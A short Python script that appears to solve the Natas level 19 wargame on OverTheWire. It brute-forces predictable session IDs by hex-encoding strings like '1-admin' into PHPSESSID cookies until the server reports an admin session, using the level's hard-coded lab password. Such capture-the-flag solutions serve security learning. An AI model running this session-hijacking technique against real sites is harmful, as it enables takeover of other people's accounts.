import requests
import binascii
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas19', 'qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT')
url = "http://natas19.natas.labs.overthewire.org"

for i in range(1, 641):
    raw = f"{i}-admin"
    session_id = binascii.hexlify(raw.encode()).decode()
    cookies = {"PHPSESSID": session_id}

    r = requests.get(url, auth=basicAuth, cookies=cookies, timeout=5)

    if "You are an admin" in r.text:
        print(f"Found admin session: {i} -> {session_id}")
        print(r.text)
        break
else:
    print("No admin session found in range")

